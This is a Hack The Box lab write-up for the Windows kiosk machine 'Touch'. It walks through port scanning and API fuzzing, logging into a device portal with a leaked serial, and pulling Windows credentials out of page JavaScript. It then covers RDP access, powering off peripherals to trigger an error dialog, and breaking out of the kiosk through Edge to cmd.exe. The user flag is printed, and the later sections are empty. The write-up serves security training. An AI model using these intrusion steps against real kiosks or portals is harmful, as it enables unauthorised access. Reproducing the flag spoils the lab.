---
link: https://app.hackthebox.com/machines/Touch
difficulty: Easy
os: Windows
pov: red
release date: 2026-10-03
tags:
  - SN_12
image: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a2cc2bba-5e0b-41f2-842e-2f3d3cee8d22-1789977906.png
solved:
solve date:
machine no.: 2
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_hack_the_box_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">Touch Writeup</p></div>

  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a2cc2bba-5e0b-41f2-842e-2f3d3cee8d22-1789977906.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 22px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: <a href="https://app.hackthebox.com/users/1809572">nedmoeca</a></p>
    <p style="margin: 0;">Author(s): <a href="https://app.hackthebox.com/users/114053">TheCyberGeek</a></p>
    <p style="margin: 0;">Difficulty: Easy</p>
    <p style="margin: 0;">Date: DD Month Year</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Debrief


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.2 Store the target address in a shell variable

**Command:**

```bash
IP=TARGET_IP
echo $IP
```

To clear the variable:

```bash
unset IP
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.3 Verify Target is Reachable

Verify that the target machine is up and reachable by performing an ICMP ping test.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

- `-c 4` → sends 4 packets only (clean output, fast)

**Result:**

```shell
PING TARGET_IP (TARGET_IP) 56(84) bytes of data.
64 bytes from TARGET_IP: icmp_seq=1 ttl=127 time=141 ms
64 bytes from TARGET_IP: icmp_seq=2 ttl=127 time=182 ms
64 bytes from TARGET_IP: icmp_seq=3 ttl=127 time=152 ms
64 bytes from TARGET_IP: icmp_seq=4 ttl=127 time=152 ms

--- TARGET_IP ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 141.026/156.906/182.361/15.378 ms
```

**What this gives you:** 
The host is alive and the tunnel works. 0% packet loss across 4 packets. 

**Key finding:** `ttl=127`. Windows hosts set an initial TTL of 128; each router hop decrements it by one, so a received value of 127 means one hop and an original 128. A strong indicator the target is **Windows**. (Linux/Unix typically starts at 64, which would arrive as 63.) This is a hint, not proof. TTL can be altered but it aligns with Touch being a Windows kiosk box.

**Next:** With reachability confirmed and a Windows OS suspected, enumerate every open TCP port to map the attack surface.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.4 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 1.4.1 Full Port Sweep

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

**Command:** `nmap -p- --min-rate 5000 -Pn TARGET_IP | grapo`

**Breakdown:**

| Component         | Purpose             | Simple Explanation                                                                                                                                                                                                                                 |
| ----------------- | ------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `nmap`            | Port scanner        | Sends packets to each port and classifies the response as open, closed, or filtered.                                                                                                                                                               |
| `-p-`             | Port range          | Shorthand for ports 1–65535. Without it nmap checks only its built-in list of 1000 common ports.                                                                                                                                                   |
| `--min-rate 5000` | Timing floor        | Forces at least 5000 packets per second instead of letting nmap's adaptive timing throttle down. This is what makes a full-range scan finish in seconds rather than minutes. Note the **double** dash.                                             |
| `-Pn`             | Skip host discovery | Treats the host as up without pinging first. HTB machines commonly drop ICMP; without this, nmap may conclude the host is down and scan nothing.                                                                                                   |
| `\| grapo`        | Custom filter       | Local zsh function: `tee /dev/tty \| grep -oP '^\d+(?=/tcp\s+open)' \| paste -sd, \| sed 's/^/\n/'`. Prints the full nmap output to the terminal while extracting open port numbers into a comma-separated list ready to paste into the next scan. |

**Result:**

```shell
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
8443/tcp open  https-alt
```

**What this gives you:** Four open ports; the other 65,531 are filtered (silently dropped), which signals a host firewall allowing only these services. 

**Key finding:** nothing hides on a high port, the attack surface is exactly `135, 3389, 5985, 8443`.

**Next:** Run a targeted service/version scan against only those four ports to fingerprint what's actually listening.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 1.4.2 Fingerprint services and versions

With the open-port list, identify the software and versions behind each, so you know which is the real entry point before spending effort anywhere.

**Command:** `nmap -A -p p1,p2,p3,p4 TARGET_IP`

**Breakdown:**

- **`-A`**
    - **Description:** Aggressive Scan Mode.
    - **Purpose:** Enables OS detection, version detection, script scanning (`-sC`), and traceroute all at once.
- `-p`
    - **Description:** Targeted Port List.
    - **Purpose:** Restricts the heavy scanning to only the ports you confirmed are open, saving significant time and processing power.


**Result:**

```shell
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Service
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
8443/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Nexion DeviceHub - Login
|_Requested resource was /login
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-cors: GET POST PUT OPTIONS
Aggressive OS guesses: Microsoft Windows 11 24H2 (91%), ...
Service Info: OS: Windows
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 1.4.3 Scan Results Analysis

| Port | Service | Version               | Analysis                                                                                                   | Simple Explanation                                                                            |
| ---- | ------- | --------------------- | ---------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------- |
| 135  | MSRPC   | Microsoft Windows RPC | Standard RPC endpoint mapper. Rarely a direct entry; context only.                                         | The switchboard Windows uses to find its own services. Not a door we can walk through.        |
| 3389 | RDP     | MS Terminal Service   | Remote Desktop. The eventual interactive path once credentials are held.                                   | Full remote-desktop login — like sitting at the machine, if you have a username and password. |
| 5985 | WinRM   | Microsoft-HTTPAPI/2.0 | PowerShell remoting. Natural credential-reuse target; turns out to be a dead end here.                     | Remote command channel for admins. Looks promising but refuses every credential we get.       |
| 8443 | HTTP    | Microsoft-HTTPAPI/2.0 | **Nexion DeviceHub** management portal; redirect to `/login`, permissive CORS. The primary attack surface. | A web control panel for the kiosk's hardware. This is where the break-in starts.              |

**Key finding:** port 8443 hosts the **Nexion DeviceHub** vendor portal. A device-management web app on a kiosk is exactly the kind of component shipped with weak default auth. All initial effort goes here.

**Next:** Enumerate the DeviceHub portal for unauthenticated endpoints before touching the login form.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Discover unauthenticated API endpoints on the DeviceHub portal (Enumeration)

**Why this step:** Recon flagged 8443 as the Nexion DeviceHub portal. Before attacking the login form, map what the app exposes without credentials a management API often gates its HTML pages but leaves individual API routes open.

**Command (first attempt: reveals the redirect behavior):**

```
ffuf -u http://TARGET_IP:8443/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404
```

**Result (first attempt):**

```
.env           [Status: 302, Size: 0, Words: 1, Lines: 1]
.git/config    [Status: 302, Size: 0, Words: 1, Lines: 1]
.ssh           [Status: 302, Size: 0, Words: 1, Lines: 1]
... (every path returns 302, Size: 0)
```

Every path came back `302` with a zero-length body. This is not a wall of real findings. The portal redirects **every** unauthenticated request to `/login`. Filtering only `404` was useless here because the server never returns `404`; its "noise" signature is `302 / size 0`. That observation drives the refined filter below.

**Command (refined: filter the redirect noise, then drill into `/api/`):**

```
# Top-level content discovery, now filtering the 302 redirect noise
ffuf -u http://TARGET_IP:8443/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404,302

# Drill into the /api/ namespace
ffuf -u http://TARGET_IP:8443/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404,302
```

**Breakdown:**

|Component|Meaning|
|---|---|
|`ffuf`|Web fuzzer; replaces the `FUZZ` keyword with each wordlist entry and requests it.|
|`-u .../FUZZ`|Injection point in the URL path; second run nests it under `/api/`.|
|`-w .../common.txt`|SecLists common web-content wordlist (~4,750 entries).|
|`-fc 404`|First attempt: filter only `404`. Left a wall of 302s — insufficient.|
|`-fc 404,302`|Refined: also filter the `302` redirect-to-login responses. Removes the blanket noise so only genuinely distinct responses remain.|

**Result (refined):**

```
# Top-level
api            [Status: 403, Size: 35]
favicon.ico    [Status: 200, Size: 452]
login          [Status: 200, Size: 3572]

# /api/
scan           [Status: 405, Size: 30]
status         [Status: 200, Size: 116]
```

**What this gives you:** 

- The portal redirects all gated content to `/login` (302), so status-code filtering is what exposes the exceptions. Add the app's own noise signature to the filter, don't just filter generic `404`s. 

- **Key finding:** `/api/status` returns `200` with a body and **no authentication**. A public endpoint on a management API. `/api/scan` exists but returns `405` (requires a different HTTP method; it's the scanner upload route, a known dead end). `/api` itself is `403`, confirming the namespace exists while hiding its index.

**Next:** Read the `/api/status` response to see what the unauthenticated endpoint discloses.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.2 Extract the device serial from the unauthenticated status endpoint (Enumeration)

**Why this step:** Endpoint discovery (2.1) found `/api/status` returning `200` with no authentication. Read its body to see what it discloses.

**Command:**

```
curl -s http://TARGET_IP:8443/api/status
```

**Breakdown:**

|Component|Meaning|
|---|---|
|`curl`|Command-line HTTP client.|
|`-s`|Silent mode: suppress the progress meter, print only the response body.|
|`http://TARGET_IP:8443/api/status`|The unauthenticated endpoint found in 2.1.|

**Result:**

```
{"device":"Nexion DeviceHub DH-100","serial":"NX-DH-2024-B7042","firmware":"1.4.2","status":"online","uptime":77907}
```

**What this gives you:** An unauthenticated JSON disclosure of device metadata. **Key finding:** the device serial `NX-DH-2024-B7042`. On embedded and kiosk devices the serial frequently doubles as the factory default administrative password, and the DeviceHub login prompts for a password only (no username), consistent with a single shared device secret. This serial is the candidate credential for the portal.

**Next:** Authenticate to `/login` using the serial as the password and confirm a session is granted.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.3 Authenticate to the portal using the serial as the password (Enumeration)

**Why this step:** The status endpoint (2.2) leaked serial `NX-DH-2024-B7042`, and the login form prompts for a password only (no username field). Test the serial as the device's default admin password.

**Action (browser, primary):**

1. Browse to `http://TARGET_IP:8443/`. The Nexion DeviceHub login page loads, showing a single password field (no username).
2. Enter the serial `NX-DH-2024-B7042` in the password field and click **Sign In**.
3. The page redirects to `/dashboard` and renders the device-management console (Scanner / Printer status cards, Recent Activity log). The "Admin login successful" line appears at the top of the activity log, confirming the session.

![[devicehub-login.png]]

![[devicehub-dashboard.png]]

**Alternative (curl, scriptable):** Submit the same login from the command line to capture the session cookie for reuse:

```
curl -s -i -c nexion.cookies -X POST http://TARGET_IP:8443/login --data "password=NX-DH-2024-B7042"
```

|Component|Meaning|
|---|---|
|`curl`|Command-line HTTP client.|
|`-s`|Silent: suppress the progress meter.|
|`-i`|Include response headers, so the status line and `Set-Cookie` are visible.|
|`-c nexion.cookies`|Write received cookies to `nexion.cookies` for reuse on later requests.|
|`-X POST`|Send an HTTP POST, the method the login form uses.|
|`--data "password=NX-DH-2024-B7042"`|The form body: the serial submitted as the password.|

**Result (curl):**

```
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: nxsession=39d7ebbbeb4a4ee296dd2ae33e09acae; Path=/
Access-Control-Allow-Origin: *
```

**What this gives you:** 

- Authentication succeeds with the serial as the password, landing on `/dashboard` in the browser and returning a `302` to `/dashboard` plus a `Set-Cookie: nxsession=...` via curl. 
- **Key finding:** the device serial doubles as the portal's administrative password. The browser route gives an interactive console; the curl route banks a reusable `nxsession` cookie for authenticated requests and scripting.

**Next:** Inspect the authenticated dashboard's client-side source for secrets exposed by the "show password" toggle.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.4 Recover local Windows credentials from client-side JavaScript (Enumeration)

**Why this step:** The serial login (2.3) granted a dashboard session. The device cards mask a Username and Password behind a "show" toggle. A client-side reveal toggle implies the secret is already present in the page, so inspect the source rather than trusting the mask.

**Theory, for a first-timer: why "show password" is not a server request.** When a web page hides a password behind dots and offers a "show" link, there are two ways it could work. Either clicking "show" asks the server for the real value, or the server already sent the real value and the page is just visually masking it with styling. The lazy and insecure way is the second one, and it is extremely common. The real password is written into the HTML or JavaScript when the page loads, and the "show" link only flips a display property. That means anyone who views the page source, with no click at all, already has the secret. You confirm which case you are in by opening the browser's developer tools (F12) or view-source (Ctrl+U) and reading the raw markup.

**Command / action:**

```
# Browser: log in with the serial, open /dashboard, click "show", then view source (Ctrl+U) or Inspect (F12)
# Equivalent from the command line:
curl -s -b nexion.cookies http://TARGET_IP:8443/dashboard | grep -o "toggleCred([^)]*)"
```

**Breakdown:**

|Component|Meaning|
|---|---|
|`curl -s -b nexion.cookies`|Request the dashboard using the saved authenticated session cookie.|
|`http://TARGET_IP:8443/dashboard`|The authenticated dashboard page.|
|`grep -o "toggleCred([^)]*)"`|Print only the reveal-function calls and their arguments from the page source.|

**Result:** The dashboard markup contains the reveal handler with the password passed as a literal argument, confirmed in DevTools:

```html
<span ... onclick="toggleCred('dsp1','K!0sk2026#')">
```

Revealed values on both device cards:

```
Username: KioskUser
Password: K!0sk2026#
```

![[dashboard-creds.png]]

**What this gives you:** 

- A local Windows account, `KioskUser : K!0sk2026#`, exposed in client-side source. 
- **Key finding:** the "show" toggle is cosmetic; the credential is delivered to the browser on page load, so no privileged action is needed to read it. These credentials are reusable against the host's remote-access services.

**Next:** RDP into the host as `KioskUser` over port 3389 to gain interactive access.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation

### 3.1 RDP into the kiosk as KioskUser (Exploitation and Initial Access)

**Why this step:** The dashboard credential leak (2.4) yielded `KioskUser : K!0sk2026#`, and port 3389 (RDP) was open in recon (1.3). Use the credential for interactive access to the host.

**Command:**

```
xfreerdp /v:TARGET_IP /u:KioskUser /p:'K!0sk2026#' /cert:ignore /dynamic-resolution +clipboard
```

**Breakdown:**

|Component|Meaning|
|---|---|
|`xfreerdp`|Linux RDP client.|
|`/v:TARGET_IP`|Target host to connect to.|
|`/u:KioskUser`|Username.|
|`/p:'K!0sk2026#'`|Password, single-quoted so the shell treats `!` and `#` literally.|
|`/cert:ignore`|Accept the host's self-signed RDP certificate without prompting.|
|`/dynamic-resolution`|Allow the session to resize with the client window.|
|`+clipboard`|Enable clipboard sharing between Kali and the session (needed later for pasting commands).|

**Result:** The client negotiates (server declines enhanced SSL and falls back to standard RDP security, logged as `SSL_NOT_ALLOWED_BY_SERVER`, non-fatal) and a session opens. The desktop is replaced by a fullscreen kiosk application:

```
HTB AIRWAYS  —  T4 · Gate B7 · #042
SELF CHECK-IN  /  Touch screen to begin
Footer: Terminal 4 | Gate B7 | Kiosk #042 | System Online
Bottom-right button: STAFF LOGIN
```

![[kiosk-welcome.png]]

**What this gives you:** An interactive session as `KioskUser`, but confined to a fullscreen kiosk shell with no desktop, taskbar, or Start menu. **Key finding:** `KioskUser` is a member of Remote Desktop Users, so RDP logon is permitted; the lockdown is an application-level jail, not a true restriction on the account. Escaping that jail is the next objective.

**Next:** Disable the kiosk's peripherals from the DeviceHub portal so the staff-login flow fails into a browser-spawning error dialog.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.2 Disable the kiosk peripherals from the DeviceHub portal (Exploitation and Initial Access)

**Why this step:** The kiosk's staff-authentication flow depends on the passport scanner to read a badge (3.1). Taking the scanner offline forces that flow to fail into an error path. The DeviceHub portal, already under our control (2.3), exposes a Power Off control per device.

**Action:**

```
# In the authenticated DeviceHub dashboard (browser):
# Click "Power Off" on the Passport Scanner card
# Click "Power Off" on the Boarding Pass Printer card
```

**Result:** Both devices transition to an offline state, confirmed in the dashboard and the activity log:

```
Status: OFFLINE   (Passport Scanner, Nexion DocReader SR-4200)
Status: OFFLINE   (Boarding Pass Printer, Nexion TP-820)
Header indicators: Scanner Offline | Printer Offline

Recent Activity:
[2026-10-04 22:22:17] Printer power set to OFF
[2026-10-04 22:22:13] Scanner power set to OFF
```

![[devicehub-poweroff.png]]

**What this gives you:** 

- Administrative control of the portal is turned into physical-layer sabotage of the kiosk. 
- **Key finding:** powering off the scanner removes the hardware the staff-login badge scan depends on, which forces the kiosk application down an unhandled error path when staff authentication is attempted. This is a legitimate portal function repurposed to break the kiosk.

**Next:** Trigger the staff badge scan in the kiosk so the offline scanner produces an error dialog containing a support hyperlink.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.3 Trigger the peripheral error dialog to surface a support link (Exploitation and Initial Access)

**Why this step:** With the scanner powered off (3.2), the kiosk's staff-authentication flow cannot complete a badge scan. Driving it to that failure produces an error dialog that, unlike the kiosk itself, contains a clickable external hyperlink.

**Action (exact sequence in the kiosk/RDP window):**

```
1. From the welcome screen, click STAFF LOGIN (bottom-right).
2. On the "Staff Authentication" screen, click the green SCAN BADGE button.
3. The app attempts to read the badge from the now-offline scanner and fails,
   raising a "Scanner offline" state and an error dialog.
```

**Result:** An application error dialog appears:

```
Nexion DocReader SR-4200 - Error
Nexion DocReader SR-4200 has stopped responding.
Error Code: SCN-ERR-4092
Device: NX-SR-2024-0042
Contact your system administrator or visit the support page for troubleshooting steps.
https://support.nexionsystems.com/docreader/troubleshoot
```

![[kiosk-error-dialog.png]]

**What this gives you:** The kiosk's error handling exposes a clickable hyperlink. **Key finding:** a locked-down kiosk should never provide a path to arbitrary programs, but this dialog's support link will open in the system default browser, giving a general-purpose application from inside the jail. The staff-login flow has to be reached first (STAFF LOGIN, then SCAN BADGE) for the offline scanner to produce this dialog.

**Next:** Click the support hyperlink to launch the default browser on top of the kiosk.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.4 Escape the kiosk by opening the browser from the error dialog (Exploitation and Initial Access)

**Why this step:** The error dialog (3.3) contains an external support hyperlink. Clicking it forces the kiosk to hand control to the system default browser, a general-purpose application the lockdown never intended to expose.

**Action:**

```
# In the kiosk error dialog, click the hyperlink:
https://support.nexionsystems.com/docreader/troubleshoot
```

**Result:** Microsoft Edge launches on top of the kiosk with a full, editable address bar. The page fails to load (the host has no outbound internet) and shows an offline error:

```
You're not connected
DNS_PROBE_FINISHED_NO_INTERNET
```

![[edge-launched.png]]

**What this gives you:** A fully featured browser running inside the kiosk session. **Key finding:** the page failing to load is irrelevant; the win is the browser process itself. Its address bar and Save/Open dialogs are general-purpose interfaces to the local filesystem and to launching executables, which is all that is needed to break out of the kiosk shell. Lack of internet on the target does not hinder local-only actions.

**Next:** Use the Edge address bar (or a Save-As dialog) to launch `C:\Windows\System32\cmd.exe` and obtain a shell as KioskUser.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.5 Launch cmd.exe from the browser to obtain a shell as KioskUser (Exploitation and Initial Access)

**Why this step:** With Edge open inside the kiosk (3.4), its address bar can request a local executable. Edge downloads the binary and offers to open it, which runs it in the kiosk user's context, converting a browser into a command shell.

**Action:**

```
# In the Edge address bar, enter the local path to cmd.exe:
C:\Windows\System32\cmd.exe
# Edge downloads it; in the Downloads tray click "Open file"
# (Alternative: Ctrl+S Save-As dialog, type the same path in its address bar and Enter)
```

**Result:** A command prompt opens as the kiosk user:

```
C:\Users\KioskUser\Downloads>
```

![[cmd-shell.png]]

**What this gives you:** Interactive command execution as `KIOSK-042\KioskUser`, outside the kiosk application entirely. **Key finding:** Edge "downloads" the local `cmd.exe` into `C:\Users\KioskUser\Downloads\` and opening it spawns a shell; a browser's download-and-open behavior is enough to break a kiosk that lacks application whitelisting. A harmless "cannot find message text" banner is a cosmetic artifact of the launch method, not an error.

**Next:** Confirm the identity and read the user flag from the KioskUser desktop.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.6 Confirm identity and capture the user flag (Exploitation and Initial Access)

**Why this step:** With a shell as the kiosk user (3.5), verify the security context and collect the user-level objective before escalating.

**Command:**

```
whoami
type C:\Users\KioskUser\Desktop\user.txt
```

**Result:**

```
C:\Users\KioskUser\Downloads>whoami
kiosk-042\kioskuser

C:\Users\KioskUser\Downloads>type C:\Users\KioskUser\Desktop\user.txt
c367f826a4bf564b4a1f92bc0499a6b0
```

**What this gives you:** Confirmation of a local, low-privileged account (`KIOSK-042\KioskUser`) and the user flag. **USER FLAG: `c367f826a4bf564b4a1f92bc0499a6b0`**

**Next:** Upgrade to a more comfortable reverse shell, then enumerate for a privilege-escalation path to SYSTEM.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Post-Exploitation
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. PrivEsc
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Lessons Learned
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Remediation Recommendations
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

